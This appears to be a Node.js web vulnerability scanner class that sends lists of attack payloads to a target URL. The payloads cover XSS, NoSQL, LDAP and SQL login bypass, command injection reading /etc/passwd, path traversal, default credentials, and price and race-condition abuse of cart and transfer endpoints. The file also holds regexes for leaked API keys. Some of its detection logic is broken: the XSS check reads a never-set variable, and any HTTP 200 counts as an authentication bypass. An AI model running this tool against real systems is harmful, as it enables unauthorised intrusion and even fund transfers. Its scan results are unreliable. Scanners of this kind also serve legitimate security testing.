const axios = require('axios');
const cheerio = require('cheerio');
const puppeteer = require('puppeteer');
const crypto = require('crypto');
const { URL } = require('url');

class AdvancedBugScanner {
  constructor() {
    this.userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
    this.timeout = 30000;
  }

  // Advanced XSS Detection
  async scanAdvancedXSS(targetUrl) {
    const xssResults = [];
    const payloads = [
      // DOM-based XSS
      '<script>alert("DOM-XSS")</script>',
      '<img src=x onerror=alert("DOM-XSS")>',
      '<svg onload=alert("DOM-XSS")>',
      'javascript:alert("DOM-XSS")',
      '<iframe src="javascript:alert(\'DOM-XSS\')"></iframe>',
      
      // Stored XSS
      '<script>alert("Stored-XSS")</script>',
      '<img src=x onerror=alert("Stored-XSS")>',
      '<svg onload=alert("Stored-XSS")>',
      
      // Filter bypass
      '<ScRiPt>alert("Bypass")</ScRiPt>',
      '<script>alert(String.fromCharCode(88,83,83))</script>',
      '<img src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>',
      '<iframe src=javascript:alert(1)></iframe>',
      
      // Event handlers
      '<div onmouseover="alert(1)">XSS</div>',
      '<input onfocus="alert(1)" autofocus>',
      '<select onfocus="alert(1)" autofocus>',
      '<textarea onfocus="alert(1)" autofocus>',
      '<keygen onfocus="alert(1)" autofocus>',
      '<video><source onerror="alert(1)">',
      '<audio src=x onerror="alert(1)">',
      
      // CSS injection
      '<style>@import\'javascript:alert("XSS")\';</style>',
      '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
      '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
      
      // Data URI
      'data:text/html,<script>alert("XSS")</script>',
      'data:text/html,<img src=x onerror=alert(1)>',
      
      // Protocol handlers
      'vbscript:alert("XSS")',
      'data:text/html,<script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      
      // Unicode bypass
      '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
      '&#60;script&#62;alert("XSS")&#60;/script&#62;',
      '&lt;script&gt;alert("XSS")&lt;/script&gt;'
    ];

    try {
      const browser = await puppeteer.launch({ headless: true });
      const page = await browser.newPage();
      
      for (const payload of payloads) {
        try {
          await page.goto(`${targetUrl}?test=${encodeURIComponent(payload)}`, {
            waitUntil: 'networkidle2',
            timeout: 10000
          });
          
          const alerts = await page.evaluate(() => {
            return window.alertCalls || [];
          });
          
          if (alerts.length > 0) {
            xssResults.push({
              type: 'Advanced XSS',
              payload: payload,
              location: 'URL parameter',
              severity: 'High',
              evidence: 'XSS payload executed'
            });
          }
        } catch (error) {
          // Continue with next payload
        }
      }
      
      await browser.close();
    } catch (error) {
      console.error('Advanced XSS scan error:', error);
    }

    return xssResults;
  }

  // Business Logic Vulnerabilities
  async scanBusinessLogic(targetUrl) {
    const logicResults = [];
    
    try {
      // Price manipulation
      const pricePayloads = [
        { price: -1, quantity: 1 },
        { price: 0, quantity: 1 },
        { price: 0.01, quantity: 999999 },
        { price: 999999, quantity: 0.01 }
      ];

      for (const payload of pricePayloads) {
        try {
          const response = await axios.post(`${targetUrl}/api/cart`, payload, {
            timeout: 10000,
            headers: { 'Content-Type': 'application/json' }
          });
          
          if (response.status === 200) {
            logicResults.push({
              type: 'Price Manipulation',
              payload: payload,
              vulnerable: true,
              evidence: 'Price manipulation accepted'
            });
          }
        } catch (error) {
          // Continue with next payload
        }
      }

      // Race condition testing
      const racePromises = Array(10).fill().map(() => 
        axios.post(`${targetUrl}/api/transfer`, {
          from: 'user1',
          to: 'user2',
          amount: 100
        }, { timeout: 5000 })
      );

      const raceResults = await Promise.allSettled(racePromises);
      const successfulTransfers = raceResults.filter(r => r.status === 'fulfilled').length;
      
      if (successfulTransfers > 1) {
        logicResults.push({
          type: 'Race Condition',
          vulnerable: true,
          evidence: 'Multiple transfers processed simultaneously'
        });
      }

    } catch (error) {
      console.error('Business logic scan error:', error);
    }

    return logicResults;
  }

  // HTTP Parameter Pollution
  async scanHPP(targetUrl) {
    const hppResults = [];
    const hppPayloads = [
      'id=1&id=2',
      'user=admin&user=guest',
      'role=user&role=admin',
      'price=100&price=0',
      'quantity=1&quantity=999'
    ];

    for (const payload of hppPayloads) {
      try {
        const response = await axios.get(`${targetUrl}?${payload}`, {
          timeout: 10000,
          headers: { 'User-Agent': this.userAgent }
        });
        
        if (response.data.includes('admin') || 
            response.data.includes('privileged') ||
            response.data.includes('elevated')) {
          hppResults.push({
            url: `${targetUrl}?${payload}`,
            payload: payload,
            vulnerable: true,
            evidence: 'Parameter pollution detected'
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return hppResults;
  }

  // NoSQL Injection
  async scanNoSQLInjection(targetUrl) {
    const nosqlResults = [];
    const nosqlPayloads = [
      // MongoDB injection
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"$regex": ".*"}',
      '{"$where": "this.username == this.password"}',
      '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
      
      // CouchDB injection
      '{"$ne": null}',
      '{"$gt": ""}',
      
      // Cassandra injection
      '{"$ne": null}',
      '{"$gt": ""}'
    ];

    for (const payload of nosqlPayloads) {
      try {
        const response = await axios.post(targetUrl, {
          username: payload,
          password: payload
        }, {
          timeout: 10000,
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': this.userAgent
          }
        });
        
        if (response.data.includes('admin') || 
            response.data.includes('success') ||
            response.data.includes('authenticated')) {
          nosqlResults.push({
            url: targetUrl,
            payload: payload,
            vulnerable: true,
            evidence: 'NoSQL injection successful'
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return nosqlResults;
  }

  // LDAP Injection
  async scanLDAPInjection(targetUrl) {
    const ldapResults = [];
    const ldapPayloads = [
      '*',
      '*)(uid=*))(|(uid=*',
      '*)(|(password=*',
      '*)(|(objectClass=*',
      'admin)(&(password=*',
      '*)(|(cn=*',
      '*)(|(mail=*'
    ];

    for (const payload of ldapPayloads) {
      try {
        const response = await axios.post(targetUrl, {
          username: payload,
          password: 'test'
        }, {
          timeout: 10000,
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': this.userAgent
          }
        });
        
        if (response.data.includes('admin') || 
            response.data.includes('success') ||
            response.data.includes('authenticated')) {
          ldapResults.push({
            url: targetUrl,
            payload: payload,
            vulnerable: true,
            evidence: 'LDAP injection successful'
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return ldapResults;
  }

  // Command Injection
  async scanCommandInjection(targetUrl) {
    const cmdResults = [];
    const cmdPayloads = [
      '; ls',
      '| ls',
      '& ls',
      '` ls `',
      '$( ls )',
      '; cat /etc/passwd',
      '| cat /etc/passwd',
      '& cat /etc/passwd',
      '` cat /etc/passwd `',
      '$( cat /etc/passwd )',
      '; whoami',
      '| whoami',
      '& whoami',
      '` whoami `',
      '$( whoami )',
      '; id',
      '| id',
      '& id',
      '` id `',
      '$( id )'
    ];

    for (const payload of cmdPayloads) {
      try {
        const response = await axios.get(`${targetUrl}?cmd=${encodeURIComponent(payload)}`, {
          timeout: 10000,
          headers: { 'User-Agent': this.userAgent }
        });
        
        if (response.data.includes('root:') ||
            response.data.includes('uid=') ||
            response.data.includes('gid=') ||
            response.data.includes('bin:') ||
            response.data.includes('daemon:')) {
          cmdResults.push({
            url: `${targetUrl}?cmd=${payload}`,
            payload: payload,
            vulnerable: true,
            evidence: 'Command injection successful'
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return cmdResults;
  }

  // Path Traversal
  async scanPathTraversal(targetUrl) {
    const pathResults = [];
    const pathPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%252F..%252F..%252Fetc%252Fpasswd',
      '/etc/passwd',
      'C:\\windows\\system32\\drivers\\etc\\hosts',
      'file:///etc/passwd',
      'php://filter/read=convert.base64-encode/resource=index.php',
      'zip://test.zip#test.txt',
      'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='
    ];

    for (const payload of pathPayloads) {
      try {
        const response = await axios.get(`${targetUrl}?file=${encodeURIComponent(payload)}`, {
          timeout: 10000,
          headers: { 'User-Agent': this.userAgent }
        });
        
        if (response.data.includes('root:') ||
            response.data.includes('bin:') ||
            response.data.includes('daemon:') ||
            response.data.includes('127.0.0.1') ||
            response.data.includes('localhost') ||
            response.data.includes('<?php') ||
            response.data.includes('<?=')) {
          pathResults.push({
            url: `${targetUrl}?file=${payload}`,
            payload: payload,
            vulnerable: true,
            evidence: 'Path traversal successful'
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return pathResults;
  }

  // Authentication Bypass
  async scanAuthBypass(targetUrl) {
    const authResults = [];
    const authPayloads = [
      // SQL injection in login
      "' OR '1'='1' --",
      "' OR 1=1 --",
      "admin'--",
      "admin'/*",
      "' OR 'x'='x",
      "' OR 1=1#",
      "' OR 1=1/*",
      
      // NoSQL injection in login
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"$regex": ".*"}',
      
      // LDAP injection in login
      '*',
      '*)(uid=*))(|(uid=*',
      '*)(|(password=*',
      
      // Default credentials
      'admin:admin',
      'admin:password',
      'admin:123456',
      'root:root',
      'root:password',
      'administrator:administrator',
      'guest:guest',
      'test:test',
      'demo:demo',
      'user:user'
    ];

    for (const payload of authPayloads) {
      try {
        const [username, password] = payload.includes(':') ? 
          payload.split(':') : [payload, 'test'];
        
        const response = await axios.post(`${targetUrl}/login`, {
          username: username,
          password: password
        }, {
          timeout: 10000,
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': this.userAgent
          }
        });
        
        if (response.data.includes('success') ||
            response.data.includes('authenticated') ||
            response.data.includes('token') ||
            response.data.includes('session') ||
            response.status === 200) {
          authResults.push({
            url: `${targetUrl}/login`,
            payload: payload,
            vulnerable: true,
            evidence: 'Authentication bypass successful'
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return authResults;
  }

  // Session Management Issues
  async scanSessionIssues(targetUrl) {
    const sessionResults = [];
    
    try {
      // Test session fixation
      const response1 = await axios.get(`${targetUrl}/login`, {
        timeout: 10000,
        headers: { 'User-Agent': this.userAgent }
      });
      
      const sessionId1 = response1.headers['set-cookie']?.[0]?.split(';')[0];
      
      if (sessionId1) {
        const response2 = await axios.post(`${targetUrl}/login`, {
          username: 'test',
          password: 'test'
        }, {
          timeout: 10000,
          headers: {
            'Cookie': sessionId1,
            'Content-Type': 'application/json'
          }
        });
        
        const sessionId2 = response2.headers['set-cookie']?.[0]?.split(';')[0];
        
        if (sessionId1 === sessionId2) {
          sessionResults.push({
            type: 'Session Fixation',
            vulnerable: true,
            evidence: 'Session ID not regenerated after login'
          });
        }
      }

      // Test session timeout
      const response3 = await axios.get(`${targetUrl}/dashboard`, {
        timeout: 10000,
        headers: { 'User-Agent': this.userAgent }
      });
      
      if (response3.status === 200 && !response3.data.includes('login')) {
        sessionResults.push({
          type: 'Session Timeout',
          vulnerable: true,
          evidence: 'No session timeout implemented'
        });
      }

    } catch (error) {
      console.error('Session scan error:', error);
    }

    return sessionResults;
  }

  // Cryptographic Weaknesses
  async scanCryptoWeaknesses(targetUrl) {
    const cryptoResults = [];
    
    try {
      const response = await axios.get(targetUrl, {
        timeout: this.timeout,
        headers: { 'User-Agent': this.userAgent }
      });
      
      // Check for weak encryption
      if (response.data.includes('MD5') || 
          response.data.includes('SHA1') ||
          response.data.includes('DES') ||
          response.data.includes('RC4')) {
        cryptoResults.push({
          type: 'Weak Encryption',
          vulnerable: true,
          evidence: 'Weak cryptographic algorithms detected'
        });
      }

      // Check for hardcoded keys
      const keyPatterns = [
        /[A-Za-z0-9+/]{40,}={0,2}/g, // Base64 keys
        /[A-Fa-f0-9]{32,}/g, // Hex keys
        /sk_[a-zA-Z0-9]{24,}/g, // Stripe keys
        /pk_[a-zA-Z0-9]{24,}/g, // Stripe keys
        /AKIA[0-9A-Z]{16}/g, // AWS keys
        /AIza[0-9A-Za-z\\-_]{35}/g // Google API keys
      ];

      keyPatterns.forEach(pattern => {
        const matches = response.data.match(pattern);
        if (matches) {
          cryptoResults.push({
            type: 'Hardcoded Keys',
            vulnerable: true,
            evidence: `Hardcoded keys found: ${matches.length}`
          });
        }
      });

    } catch (error) {
      console.error('Crypto scan error:', error);
    }

    return cryptoResults;
  }

  // Information Disclosure
  async scanInfoDisclosure(targetUrl) {
    const infoResults = [];
    
    try {
      const response = await axios.get(targetUrl, {
        timeout: this.timeout,
        headers: { 'User-Agent': this.userAgent }
      });
      
      // Check for sensitive information
      const sensitivePatterns = [
        /password\s*[:=]\s*["']?[^"'\s]+["']?/gi,
        /api[_-]?key\s*[:=]\s*["']?[^"'\s]+["']?/gi,
        /secret\s*[:=]\s*["']?[^"'\s]+["']?/gi,
        /token\s*[:=]\s*["']?[^"'\s]+["']?/gi,
        /database\s*[:=]\s*["']?[^"'\s]+["']?/gi,
        /connection\s*[:=]\s*["']?[^"'\s]+["']?/gi,
        /debug\s*[:=]\s*true/gi,
        /test\s*[:=]\s*true/gi,
        /development\s*[:=]\s*true/gi
      ];

      sensitivePatterns.forEach(pattern => {
        const matches = response.data.match(pattern);
        if (matches) {
          infoResults.push({
            type: 'Sensitive Information',
            vulnerable: true,
            evidence: `Sensitive data exposed: ${matches[0]}`
          });
        }
      });

      // Check for error messages
      if (response.data.includes('error') ||
          response.data.includes('exception') ||
          response.data.includes('stack trace') ||
          response.data.includes('debug')) {
        infoResults.push({
          type: 'Error Information',
          vulnerable: true,
          evidence: 'Error information disclosed'
        });
      }

    } catch (error) {
      console.error('Info disclosure scan error:', error);
    }

    return infoResults;
  }

  // Main scan function
  async scanAdvancedBugs(targetUrl, options = {}) {
    const results = {
      advancedXSS: [],
      businessLogic: [],
      hpp: [],
      nosqlInjection: [],
      ldapInjection: [],
      commandInjection: [],
      pathTraversal: [],
      authBypass: [],
      sessionIssues: [],
      cryptoWeaknesses: [],
      infoDisclosure: [],
      vulnerabilities: []
    };

    try {
      const scanPromises = [
        this.scanAdvancedXSS(targetUrl),
        this.scanBusinessLogic(targetUrl),
        this.scanHPP(targetUrl),
        this.scanNoSQLInjection(targetUrl),
        this.scanLDAPInjection(targetUrl),
        this.scanCommandInjection(targetUrl),
        this.scanPathTraversal(targetUrl),
        this.scanAuthBypass(targetUrl),
        this.scanSessionIssues(targetUrl),
        this.scanCryptoWeaknesses(targetUrl),
        this.scanInfoDisclosure(targetUrl)
      ];

      const scanResults = await Promise.allSettled(scanPromises);
      
      // Process results
      scanResults.forEach((result, index) => {
        if (result.status === 'fulfilled') {
          const keys = Object.keys(results);
          if (keys[index]) {
            results[keys[index]] = result.value;
          }
        }
      });

      // Analyze for vulnerabilities
      results.vulnerabilities = this.analyzeAdvancedVulnerabilities(results);

      return results;
    } catch (error) {
      console.error('Advanced bug scan error:', error);
      throw error;
    }
  }

  // Analyze vulnerabilities
  analyzeAdvancedVulnerabilities(results) {
    const vulnerabilities = [];
    
    // Advanced XSS
    results.advancedXSS.forEach(xss => {
      vulnerabilities.push({
        name: 'Advanced XSS',
        severity: 'High',
        description: `Advanced XSS vulnerability detected with payload: ${xss.payload}`,
        poc: `Test with: ${xss.payload}`,
        remediation: 'Implement proper input validation and output encoding'
      });
    });

    // Business Logic
    results.businessLogic.forEach(logic => {
      vulnerabilities.push({
        name: 'Business Logic Flaw',
        severity: 'High',
        description: `Business logic vulnerability: ${logic.type}`,
        poc: `Test with: ${JSON.stringify(logic.payload)}`,
        remediation: 'Implement proper business logic validation'
      });
    });

    // HPP
    results.hpp.forEach(hpp => {
      vulnerabilities.push({
        name: 'HTTP Parameter Pollution',
        severity: 'Medium',
        description: 'HTTP parameter pollution vulnerability detected',
        poc: `Test with: ${hpp.payload}`,
        remediation: 'Validate and sanitize all parameters'
      });
    });

    // NoSQL Injection
    results.nosqlInjection.forEach(nosql => {
      vulnerabilities.push({
        name: 'NoSQL Injection',
        severity: 'High',
        description: 'NoSQL injection vulnerability detected',
        poc: `Test with: ${nosql.payload}`,
        remediation: 'Use parameterized queries and input validation'
      });
    });

    // LDAP Injection
    results.ldapInjection.forEach(ldap => {
      vulnerabilities.push({
        name: 'LDAP Injection',
        severity: 'High',
        description: 'LDAP injection vulnerability detected',
        poc: `Test with: ${ldap.payload}`,
        remediation: 'Use parameterized LDAP queries'
      });
    });

    // Command Injection
    results.commandInjection.forEach(cmd => {
      vulnerabilities.push({
        name: 'Command Injection',
        severity: 'Critical',
        description: 'Command injection vulnerability detected',
        poc: `Test with: ${cmd.payload}`,
        remediation: 'Avoid system commands or use proper sanitization'
      });
    });

    // Path Traversal
    results.pathTraversal.forEach(path => {
      vulnerabilities.push({
        name: 'Path Traversal',
        severity: 'High',
        description: 'Path traversal vulnerability detected',
        poc: `Test with: ${path.payload}`,
        remediation: 'Implement proper path validation'
      });
    });

    // Auth Bypass
    results.authBypass.forEach(auth => {
      vulnerabilities.push({
        name: 'Authentication Bypass',
        severity: 'Critical',
        description: 'Authentication bypass vulnerability detected',
        poc: `Test with: ${auth.payload}`,
        remediation: 'Implement proper authentication validation'
      });
    });

    // Session Issues
    results.sessionIssues.forEach(session => {
      vulnerabilities.push({
        name: 'Session Management Issue',
        severity: 'Medium',
        description: `Session management issue: ${session.type}`,
        poc: 'Test session handling',
        remediation: 'Implement proper session management'
      });
    });

    // Crypto Weaknesses
    results.cryptoWeaknesses.forEach(crypto => {
      vulnerabilities.push({
        name: 'Cryptographic Weakness',
        severity: 'High',
        description: `Cryptographic weakness: ${crypto.type}`,
        poc: 'Check encryption implementation',
        remediation: 'Use strong cryptographic algorithms'
      });
    });

    // Info Disclosure
    results.infoDisclosure.forEach(info => {
      vulnerabilities.push({
        name: 'Information Disclosure',
        severity: 'Medium',
        description: `Information disclosure: ${info.type}`,
        poc: 'Check response content',
        remediation: 'Remove sensitive information from responses'
      });
    });

    return vulnerabilities;
  }
}

module.exports = AdvancedBugScanner;
